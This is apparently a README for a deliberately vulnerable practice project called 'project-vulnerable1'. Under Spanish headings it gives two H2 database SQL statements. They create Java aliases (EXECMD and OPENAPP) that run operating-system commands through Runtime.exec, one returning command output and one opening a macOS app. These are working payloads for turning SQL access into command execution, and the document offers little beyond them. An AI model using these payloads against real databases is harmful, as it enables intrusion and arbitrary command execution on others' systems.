# project-vulnerable1

LINEA DE COMANDOS
```
CREATE ALIAS EXECMD AS $$ String execmd(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
```

ABRIR APP EN MAC
```
CREATE ALIAS OPENAPP AS $$ String execmd(String cmd) throws java.io.IOException { Runtime.getRuntime().exec("open -a "+cmd);return null; }$$;
```
